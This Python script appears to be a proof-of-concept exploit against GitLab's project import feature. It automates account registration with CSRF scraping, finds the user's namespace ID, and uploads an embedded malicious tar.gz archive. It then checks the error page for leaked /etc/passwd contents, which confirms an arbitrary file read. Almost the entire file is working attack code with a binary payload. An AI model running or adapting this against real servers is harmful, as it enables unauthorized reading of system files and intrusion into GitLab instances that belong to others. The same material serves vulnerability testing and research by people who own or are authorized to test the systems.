import string
import urllib.parse

import requests
import re
import random

host = "http://10.128.154.152:8080"
headers = {
    'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Connection': 'close'
}

# <meta name="csrf-token"
#       content="urEtKWxT8PsnlHrYxnoJ5bzoJCttTGzBQAMpi34hX6oWIVFzqpsLYABr+PNGb9nrHPg0QxycRWmB+R81EGVeQA==" />
csrf_pattern = re.compile(r"<meta\s+name\s*=\s*\"csrf-token\"\s*content\s*=\s*\"([\w\d/+\-=]+)\"")

# <input value="3" type="hidden" name="project[namespace_id]" id="project_namespace_id" />
namespace_pattern = re.compile(r"<input\s+value\s*=\s*\"(\d+)\"(.*?)id\s*=\s*\"project_namespace_id\"")

# <pre>Malformed version number string root:x:0:0:root:/root:/bin/bash&#x000A;</pre>
vulnerable = re.compile(r"Malformed\s+version\s+number\s+string\s+(.*?):(.*?):(.*?):(.*?):(.*?):(.*?):(.*?);")


def poc(reg_username, reg_passwd):
    user_sign_in_url = "/users/sign_in"

    try:
        rsp = requests.get(url=host + user_sign_in_url, headers=headers, timeout=15)
        cookies = rsp.cookies
        referer = host + user_sign_in_url
        csrf_match = re.search(csrf_pattern, rsp.text)
        if csrf_match is None:
            print("no csrf token found.")
            exit(-1)
        csrf_token = csrf_match.group(1)
    except Exception as e:
        print(e)

    reg_data = {
        'name': urllib.parse.unquote('%E2%9C%93'),
        'authenticity_token': csrf_token,
        'new_user[name]': reg_username,
        'new_user[username]': reg_username,
        'new_user[email]': '{}@{}.com'.format(reg_username, reg_username),
        'new_user[password]': reg_passwd
    }

    user_reg_url = "/users"
    try:
        headers['Referer'] = referer
        rsp = requests.post(url=host + user_reg_url, headers=headers, cookies=cookies,
                            data=reg_data, allow_redirects=False, timeout=15)
        cookies = rsp.cookies
        referer = host + user_reg_url
        if rsp.status_code == 302 and rsp.headers.get('Location').find('dashboard/projects') != -1:
            print("register successful")
        else:
            print("register failed")
            exit(-1)

    except Exception as e:
        print(e)

    project_new_url = "/projects/new"
    try:
        headers['Referer'] = referer
        rsp = requests.get(url=host + project_new_url, headers=headers, cookies=cookies, timeout=15)
        referer = host + project_new_url
        namespace_match = re.search(namespace_pattern, rsp.text)
        if namespace_match is None:
            print("no namespace_id value found.")
            exit(-1)
        namespace_id = namespace_match.group(1)
    except Exception as e:
        print(e)

    import_url = "/import/gitlab_project"
    payload = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03\xed\xd3\xb1\n\x830\x10\xc6\xf1<J\x9e@\x13c\xcc\x13t\xe8\xd2B' \
              b'\x0b\xddE\xa5\xe0\xa0b,}\xfdFK\x87.\xa5\x1d"\x14\xff\xbf\xe5 \x1c\xdc\xc1\x97KR\x11\x9d\n\x9c\xb5s\xd5\xce\xaag5K}\x11:\xcf\x8c\xb6*<\x87>\xad\xac\xcd\x85\xb4\xf1W\x13\xe2\xe6\xa7r\x94RL\xe3\xb5\xec\xea\xf2C_3\xfa5\x16ZW\x92\x0ec\xdf6\xd5\x94\xb4\xbe\xef\xe2\xcc\x98\x03.\xf2\xfc\xab\xfc3\xa7C\xfe&\xfc\x00!U\x9cu\xdem>\xff\xcb\xeet\xde\x1f\x0f\x11g,\xf7\xef\xdc\x0f\xf7o\x8a\xd0.\xb3\xb4\x99\xaat(\xbd\xbf\xd7\xd1\x96\xdbx\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8o\x0f\x9c\x87A\xf4\x00(\x00\x00'

    import_file_arg = {
        'file': ('poc.tar.gz', payload)
    }
    import_arg = {
        'name': urllib.parse.unquote('%E2%9C%93'),
        'authenticity_token': csrf_token,
        'namespace_id': namespace_id,
        'path': 'poc',
    }
    try:
        headers['Referer'] = referer
        rsp = requests.post(url=host + import_url, headers=headers, cookies=cookies,
                            files=import_file_arg, data=import_arg, timeout=15)
        referer = host + import_url
        if rsp.status_code == 200 and vulnerable.search(rsp.text) is not None:
            print("target vulnerable.")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    username = "poc".join(random.sample(string.ascii_letters + string.digits, 3))
    passwd = "pwd".join(random.sample(string.ascii_letters + string.digits, 8))

    payload = open('change_version.tar.gz', 'rb').read()
    print(payload)
    poc(username, passwd)

